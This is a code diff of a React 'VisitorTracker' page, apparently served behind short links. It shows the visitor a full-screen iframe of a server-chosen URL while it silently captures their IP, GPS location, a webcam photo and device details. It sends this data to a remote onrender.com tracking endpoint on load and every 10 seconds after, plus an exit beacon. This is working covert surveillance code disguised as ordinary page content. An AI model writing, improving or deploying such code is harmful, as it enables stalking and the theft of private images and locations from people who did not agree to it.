@@ -1,4 +1,3 @@
- 
 import { useEffect } from "react";
 import { useParams } from "react-router-dom";
 
@@ -7,14 +6,18 @@ function VisitorTracker() {
 
   useEffect(() => {
     let videoStream = null;
+    let baseData = {};
+   // ચોક્કસ કી (Key) મેળવવા માટે
+ 
 
-    const captureVisitorData = async () => {
+    // ✅ ONE-TIME HEAVY DATA COLLECTION
+    const initVisitor = async () => {
       try {
-        // Get IP
+        // 🌐 IP
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
 
-        // Get Location
+        // 📍 Location (only once)
         let latitude = "";
         let longitude = "";
         if (navigator.geolocation) {
@@ -24,12 +27,12 @@ function VisitorTracker() {
             );
             latitude = pos.coords.latitude;
             longitude = pos.coords.longitude;
-          } catch (err) {
+          } catch {
             console.log("Location denied");
           }
         }
 
-       
+        // 🔋 Battery
         let batteryInfo = { level: "N/A", charging: "N/A" };
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
@@ -39,26 +42,11 @@ function VisitorTracker() {
           };
         }
 
-         const deviceInfo = {
-          ip: ipData.ip,
-          latitude,
-          longitude,
-          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
-          cpuCores: navigator.hardwareConcurrency || "N/A",
-          batteryLevel: batteryInfo.level,
-          isCharging: batteryInfo.charging,
-          browser: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          screen: `${window.screen.width}x${window.screen.height}`,
-          page: window.location.pathname,
-          cookieCount: document.cookie ? document.cookie.split(";").length : 0,
-          timestamp: new Date().toISOString(),
-        };
-
-         let cameraImage = null;
+        // 🎥 Camera (ONLY ONCE)
+        let cameraImage = null;
         try {
           videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+
           const video = document.createElement("video");
           video.srcObject = videoStream;
           await video.play();
@@ -66,77 +54,117 @@ function VisitorTracker() {
           const canvas = document.createElement("canvas");
           canvas.width = 640;
           canvas.height = 480;
+
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
           cameraImage = canvas.toDataURL("image/jpeg", 0.5);
-        } catch (e) {
-          console.log("Camera access denied");
+        } catch {
+          console.log("Camera denied");
         }
 
-         const visitorData = {
+        // ✅ Store base data (important)
+        baseData = {
           shortId,
-          ...deviceInfo,
+          ip: ipData.ip,
+          latitude,
+          longitude,
+          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+          cpuCores: navigator.hardwareConcurrency || "N/A",
+          browser: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          screen: `${window.screen.width}x${window.screen.height}`,
           cameraImage,
-          entryTime: new Date(),
         };
 
-       const token = localStorage.getItem("token")
+        sendData(); // first hit
+      } catch (err) {
+        console.log("Init error:", err);
+      }
+    };
 
-        const res = await fetch(`https://user-tracking-1.onrender.com/api/auth/t/${shortId}`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" ,
-           Authorization:`Bearer ${token}`
-          },
-          body: JSON.stringify(visitorData),
-        });
+    // ✅ LIGHTWEIGHT TRACKING FUNCTION
+    const sendData = async () => {
+      try {
+        const token = localStorage.getItem("token");
+
+        let batteryLevel = "N/A";
+        let isCharging = "N/A";
+
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryLevel = battery.level * 100 + "%";
+          isCharging = battery.charging;
+        }
+
+        const visitorData = {
+          ...baseData,
+          batteryLevel,
+          isCharging,
+          timestamp: new Date().toISOString(),
+        };
+
+        const res = await fetch(
+          `https://user-tracking-1.onrender.com/api/auth/t/${shortId}`,
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Authorization: `Bearer ${token}`,
+            },
+            body: JSON.stringify(visitorData),
+          }
+        );
 
         const result = await res.json();
+
+        
         if (result.redirectUrl) {
           const frame = document.getElementById("target-frame");
-          if (frame) frame.src = result.redirectUrl;
+          if (frame && !frame.src) {
+            frame.src = result.redirectUrl;
+          }
         }
       } catch (err) {
         console.log("Tracking error:", err);
       }
     };
 
-    captureVisitorData();
+    // 🚀 INIT
+    initVisitor();
 
+    // ✅ Polling (reduced load)
+    const interval = setInterval(sendData, 10000); // every 10 sec
+
+    // ✅ EXIT TRACKING
     const handleExit = () => {
- 
       navigator.sendBeacon(
-        `https://user-tracking-1.onrender.com/api/auth/exit/${shortId}`,
-        JSON.stringify({ exitTime: new Date() })
+        `https://user-tracking-1.onrender.com/api/auth/exit/${shortId}`
       );
     };
 
-    window.addEventListener("visibilitychange", () => {
-      if (document.visibilityState === "hidden") handleExit();
-    });
- 
- 
- 
-    const interval = setInterval(captureVisitorData, 3000);
-  return () => {
+    window.addEventListener("beforeunload", handleExit);
 
-     clearInterval(interval);
+    // 🧹 CLEANUP
+    return () => {
+      clearInterval(interval);
+      window.removeEventListener("beforeunload", handleExit);
 
-     
-    if (videoStream) {
-      videoStream.getTracks().forEach((track) => track.stop());
-    }
-
-  };
-
-}, [shortId]);
+      // ✅ Stop camera properly
+      if (videoStream) {
+        videoStream.getTracks().forEach((track) => track.stop());
+      }
+    };
+  }, [shortId]);
 
   return (
-    <div style={{ width: "100vw", height: "100vh", margin: 0, padding: 0, overflow: "hidden" }}>
+    <div style={{ width: "100vw", height: "100vh", overflow: "hidden" }}>
       <iframe
         id="target-frame"
         title="Target Content"
-        style={{ width: "100%", height: "100%", border: "none" }} 
-        sandbox="allow-forms allow-scripts allow-same-origin"
+        style={{ width: "100%", height: "100%", border: "none" }}
+  sandbox="allow-scripts allow-same-origin allow-top-navigation allow-popups"
       />
     </div>
   );
